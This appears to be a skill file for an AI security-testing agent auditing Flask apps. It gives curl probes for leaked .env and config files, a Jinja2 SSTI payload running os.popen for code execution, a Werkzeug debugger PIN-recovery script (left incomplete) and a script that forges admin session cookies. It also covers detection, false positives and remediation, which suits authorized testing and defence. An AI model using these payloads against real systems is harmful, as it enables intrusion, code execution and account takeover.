---
name: flask
description: Flask security audit — debug PIN, Jinja2 SSTI, session forging, Werkzeug debugger, weak SECRET_KEY
triggers: [flask, werkzeug, jinja, gunicorn, flask-admin, debug pin, render_template_string]
---

# Flask Security

Flask is the second-most-common Python web framework after Django; small core, security comes from convention. Default exposures cluster around the **Werkzeug debugger** (instant RCE when DEBUG=True), **Jinja2 SSTI** via `render_template_string()`, **weak SECRET_KEY** enabling session forgery, and unscoped **flask-admin / flask-login** route exposure.

## Attack Surface

### Werkzeug debugger
- `DEBUG=True` + any unhandled exception → `/console` debugger page
- Modern Werkzeug requires the PIN; older versions don't
- PIN derived from `username + flask.__init__ path + mac address + machine ID + uuid.getnode()` — fully reproducible if attacker has filesystem read

### Jinja2 SSTI
- `render_template_string(user_input)` → instant SSTI (see ssti.md skill)
- `render_template('page.html', message=user_input)` is safe — Jinja autoescapes per template
- `Markup(user_input)` or `|safe` filter disables escaping → XSS

### SECRET_KEY
- Used to sign session cookies (`session = {...}` → `session_cookie = sign(json(session))`)
- Default in Flask quickstart tutorials: hardcoded string
- Leaked → session forging → impersonation of any user

### Session cookies
- Default backend: signed-cookie (client-side storage)
- Cookie value is base64(JSON_payload) + base64(signature)
- Attacker can read but not modify — until they have the SECRET_KEY

### flask-login / flask-admin
- `flask-admin` exposes /admin/ by default; no auth unless explicitly configured
- `flask-login`'s `@login_required` decorator easily forgotten on new routes
- `current_user.is_authenticated` checks bypassed when decorator missing

### Extensions / blueprints
- Pluggable; common ones with bugs:
  - flask-restful: serializers without permission checks
  - flask-cors: `CORS(app)` with no allow-list → permissive CORS
  - flask-talisman: misconfigured CSP defaults

## Detection Channels

### DEBUG / Werkzeug debugger probe
```bash
# Trigger a 500
curl -s 'https://<TARGET>/nonexistent_route' | grep -i 'werkzeug\|debug\|/console'

# Or POST garbage to a known endpoint
curl -X POST 'https://<TARGET>/some-endpoint' --data 'malformed=' | head -20

# Werkzeug debugger pages contain `<title>... // Werkzeug Debugger</title>`
# Console URL: /console (requires PIN unless old version)
```

### Fingerprint Flask + version
```bash
curl -sI 'https://<TARGET>/' | grep -iE 'server|x-powered-by'
# 'Werkzeug/N.M Python/X.Y' is the giveaway
```

### SSTI probe
```bash
# Any user-controlled string that ends up in a template
curl 'https://<TARGET>/greet?name={{7*7}}'
# Response with "49" = SSTI confirmed; see ssti.md for engine identification
```

### SECRET_KEY leak signals
```bash
# Common exposures
curl -s 'https://<TARGET>/.env'
curl -s 'https://<TARGET>/config.py'
curl -s 'https://<TARGET>/.git/config'  # repo exposure
curl -s 'https://<TARGET>/static/.env'

# Decoded session cookie reveals JSON payload
# Example session cookie: eyJ1c2VyX2lkIjoxfQ.YjJxxg.signature
echo 'eyJ1c2VyX2lkIjoxfQ' | base64 -d
# {"user_id": 1}
```

## Operational Runbook

### Step 1 — DEBUG probe + debugger access
```bash
# Trigger an error
curl 'https://<TARGET>/?strix_debug='

# If Werkzeug debugger pages render, try /console
curl -s 'https://<TARGET>/console' | grep -i 'pin'

# Modern Werkzeug: PIN-protected; PIN-recovery requires filesystem read
# Old Werkzeug (< 0.11): no PIN; instant RCE via the console
```

### Step 2 — PIN recovery (when filesystem read is possible)
```python
# The PIN is deterministic given:
#  - probably_public_bits: username, mod name, getattr name, abs path
#  - private_bits: mac, machineid
# Werkzeug source: werkzeug/debug/__init__.py:get_pin_and_cookie_name

import hashlib

probably_public_bits = [
    'app-user',                                       # username running the app
    'flask.app',                                      # mod name
    'Flask',                                          # getattr name
    '/usr/local/lib/python3.11/site-packages/flask/app.py',  # abs path
]
private_bits = [
    '12345678901234',  # mac (uuid.getnode() in decimal)
    'd2c0fd6b...',     # machine-id contents
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)
h.update(b'cookiesalt')
# PIN derivation from the digest
```

Tools: `werkzeug-debug-rce` (open source).

### Step 3 — SSTI confirmation + escalation
```bash
# Math probe
curl 'https://<TARGET>/template-endpoint?input={{7*7}}'

# When confirmed, run the Jinja2 RCE payload (see ssti.md)
curl 'https://<TARGET>/template-endpoint?input={{config.__class__.__init__.__globals__[%22os%22].popen(%22id%22).read()}}'
```

### Step 4 — SECRET_KEY → session forge
```bash
# Decode an existing session cookie
SESSION_COOKIE='eyJ1c2VyX2lkIjoxfQ.YjJxxg.signature'
echo "$SESSION_COOKIE" | cut -d. -f1 | base64 -d
# {"user_id": 1}

# Once you have SECRET_KEY:
python3 <<EOF
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer('<SECRET_KEY>', salt='cookie-session')
forged = s.dumps({"user_id": 1, "is_admin": True})
print(f"Forged session: {forged}")
EOF
# Use as Cookie: session=<forged>
```

### Step 5 — admin path discovery
```bash
# Common Flask admin paths
for path in /admin /flask-admin /admin/ /dashboard /control /console /management; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' "https://<TARGET>${path}")
  echo "${path} → ${STATUS}"
done

# 200 = unauthenticated admin = critical
# 302 to /login = auth gate; needs different attack
```

### Step 6 — permissive CORS
```bash
curl -sI -H 'Origin: https://attacker.com' 'https://<TARGET>/api/me' | \
  grep -iE 'access-control-allow-origin|access-control-allow-credentials'

# Access-Control-Allow-Origin: * + Allow-Credentials: false = standard but limited
# Access-Control-Allow-Origin: attacker.com (reflected) + Allow-Credentials: true = CORS misconfig
```

## Specific Vulnerability Classes

### `safe_join` bypass on Windows
- `flask.safe_join('/base', user_path)` is meant to prevent traversal
- On Windows, backslash + alternate data streams bypass

### Custom session interface gotchas
- Apps that override `SessionInterface` sometimes drop the signature step
- Detect: a session cookie that's pure base64-json with no `.signature` suffix → no signing

### `jsonify` + reflected JSON injection
- `jsonify({"user_input": user_input})` returns JSON; no JS escaping
- Bug: when the JSON response is embedded in HTML via `<script>const data = {{ data|tojson }};</script>` and `data` contains `</script>` literally, XSS

### Werkzeug's `request.host` trust
- `request.host` reflects the Host header; not validated by default
- Apps using `url_for(..., _external=True)` build URLs with attacker-controlled host → host-header injection

### `flask-cors` permissive defaults
- `CORS(app)` with no args → allow-list all origins
- Common in tutorials; persists to production

## Bypass Techniques

- **PIN brute**: when PIN-recovery is impossible, brute is feasible (1M combinations, modern hardware)
- **DEBUG=True via env**: `FLASK_DEBUG=1` env var; some prod containers leak this
- **`url_for` redirect abuse**: `url_for('endpoint')` returns `/path`; combined with `redirect(request.args.get('next'))` (the classic Flask pattern), open-redirect candidate

## Validation

1. DEBUG state: Werkzeug debugger pages render on errors.
2. /console reachable: even PIN-protected, presence confirms DEBUG=True.
3. SECRET_KEY: leaked via env / repo / debug page.
4. Session forge: signed cookie minted with attacker-chosen payload accepted by the app.
5. SSTI: math probe returns evaluated result.
6. Admin: /admin/ reachable without auth.

## False Positives

- DEBUG=True in dev/staging — confirm environment first.
- Werkzeug debugger pages from a different framework (rare but check).
- `<script>` injection that's actually HTML-XSS, not JSON-context XSS.
- SECRET_KEY in a git-tracked sample config file (not the actual production value).

## Impact

- RCE via Werkzeug console (DEBUG=True).
- RCE via Jinja2 SSTI.
- Account takeover via SECRET_KEY → session forging.
- Mass data exposure via flask-admin unauth access.

## Remediation

1. **`DEBUG=False`** in production. Use `gunicorn` / `waitress` not the dev server.
2. **`SECRET_KEY` from env**: 32+ random bytes, never in repo.
3. **`render_template_string()` avoided**; use `render_template()` with file-based templates.
4. **`flask-login.@login_required`** on every protected route; consider blueprint-level enforcement.
5. **`flask-cors` with explicit origins**: `CORS(app, origins=["https://app.example.com"])`.
6. **flask-admin behind authentication**: `expose_url='/admin'` + custom view classes with `is_accessible()`.
7. **`session.permanent = True`** + `PERMANENT_SESSION_LIFETIME` set; rotate `SECRET_KEY` on incident response.

## Pro Tips

1. Werkzeug version `< 0.15` had no PIN — instant RCE. Many old apps still in production.
2. The "PIN PROTECT" page reveals app username + path + mac in debug-info comments — useful for PIN brute.
3. Flask sessions are CLIENT-SIDE — base64-decoding the cookie reveals the session data even without SECRET_KEY (read-only).
4. `flask-restful` and `flask-restplus` ship with default `IndexResource` that lists all resources — useful for discovery.
5. The classic Flask tutorial uses `SECRET_KEY = 'dev'` — search for `'dev'` literal in any production app's config.

## Summary

Flask compactness means few defaults; security depends on developer discipline. Werkzeug DEBUG, SSTI via `render_template_string`, SECRET_KEY leakage, and flask-admin unauth access are the four canonical findings.
